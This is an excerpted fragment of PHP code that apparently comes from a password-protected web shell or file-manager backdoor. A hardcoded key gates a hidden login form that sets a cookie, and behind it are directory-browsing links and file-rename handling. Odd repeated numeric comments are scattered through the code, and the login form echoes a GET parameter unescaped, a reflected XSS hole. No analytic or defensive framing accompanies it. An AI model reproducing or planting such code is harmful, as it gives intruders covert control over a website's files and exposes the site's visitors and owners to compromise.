...
$auth_key = "0dcce23360c155e625f9415a027fffc6";
...
$pass = false;
if (isset($_COOKIE['pw_name_58567'])) {
    if(($_COOKIE['pw_name_58567']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_58567'])) {
        if(($_POST['pw_name_58567']) == $auth_key) {
            setcookie("pw_name_58567", $_POST['pw_name_58567']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_58567' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1726032290646983 1726032290785816 1726032290590758 1726032290484384
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1726032290646983 1726032290785816 1726032290590758 1726032290484384
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1726032290646983 1726032290785816 1726032290590758 1726032290484384
            $name = PATH . "/" . $_GET['r'];
